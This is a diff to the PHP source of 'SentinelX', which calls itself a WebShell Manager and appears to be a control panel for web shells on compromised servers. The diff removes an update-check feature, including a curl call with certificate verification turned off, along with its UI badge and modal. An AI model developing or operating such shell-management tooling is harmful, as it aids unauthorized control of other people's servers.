@@ -491,43 +491,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             echo json_encode(json_decode($result['body'], true) ?: ['status' => 'error', 'message' => $result['error']]);
             break;
 
-        case 'check_update':
-            if (!UPDATE_CHECK_URL) {
-                echo json_encode(['status' => 'ok', 'current' => SENTINELX_VERSION, 'latest' => SENTINELX_VERSION, 'uptodate' => true, 'url' => '', 'notes' => '']);
-                break;
-            }
-            $ch = curl_init();
-            curl_setopt_array($ch, [
-                CURLOPT_URL => UPDATE_CHECK_URL,
-                CURLOPT_RETURNTRANSFER => true,
-                CURLOPT_TIMEOUT => 3,
-                CURLOPT_CONNECTTIMEOUT => 3,
-                CURLOPT_SSL_VERIFYPEER => false,
-            ]);
-            $resp = curl_exec($ch);
-            $http = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-            curl_close($ch);
-            if ($http !== 200 || !$resp) {
-                echo json_encode([
-                    'status' => 'ok', 'current' => SENTINELX_VERSION,
-                    'latest' => SENTINELX_VERSION, 'uptodate' => true,
-                    'url' => '', 'notes' => '', 'error' => 'unreachable'
-                ]);
-                break;
-            }
-            $remote = json_decode($resp, true);
-            $latest = $remote['latest'] ?? SENTINELX_VERSION;
-            $uptodate = version_compare(SENTINELX_VERSION, $latest, '>=');
-            echo json_encode([
-                'status' => 'ok',
-                'current' => SENTINELX_VERSION,
-                'latest' => $latest,
-                'uptodate' => $uptodate,
-                'url' => $remote['url'] ?? '',
-                'notes' => $remote['notes'] ?? '',
-            ]);
-            break;
-
         default:
             echo json_encode(['status' => 'error', 'message' => 'Unknown action']);
     }
@@ -572,7 +535,6 @@ if ($action === 'download' && $_SERVER['REQUEST_METHOD'] === 'GET') {
             <div class="nav-brand">
                 <span class="brand-icon">SW</span>
                 <span class="brand-text">SentinelX</span>
-                <span class="version-badge" id="versionBadge">v<?= SENTINELX_VERSION ?></span>
                 <span class="nav-sub">WebShell Manager</span>
             </div>
             <div class="nav-actions">
@@ -588,7 +550,6 @@ if ($action === 'download' && $_SERVER['REQUEST_METHOD'] === 'GET') {
                 <button onclick="toggleTheme()" class="btn btn-sm" id="themeBtn">Light</button>
                 <a href="?logout" class="btn btn-sm" style="text-decoration:none;">Logout</a>
                 <span class="status-dot" id="connStatus" title="Server Status"></span>
-                <span id="updateNotif" class="update-badge" style="display:none;cursor:pointer;" onclick="showUpdateModal()" title="Update available!"></span>
             </div>
         </nav>
 
@@ -991,19 +952,6 @@ if ($action === 'download' && $_SERVER['REQUEST_METHOD'] === 'GET') {
             <textarea id="webreqHeaders" rows="2" placeholder="Authorization: Bearer xxx"></textarea>
             <button class="btn btn-primary" onclick="runWebReq()" style="margin-bottom:10px;">Send Request</button>
             <div id="webreqResult" class="bulk-result"></div>
-        </div>
-    </div>
-
-    <!-- Update Modal -->
-    <div id="updateModal" class="modal">
-        <div class="modal-content">
-            <div class="modal-header">
-                <h2>SentinelX Update</h2>
-                <button class="modal-close" onclick="closeModal('updateModal')">Close</button>
-            </div>
-            <div id="updateInfo" style="padding:8px 0;">
-                <div class="loading">Checking for updates...</div>
-            </div>
         </div>
     </div>
 
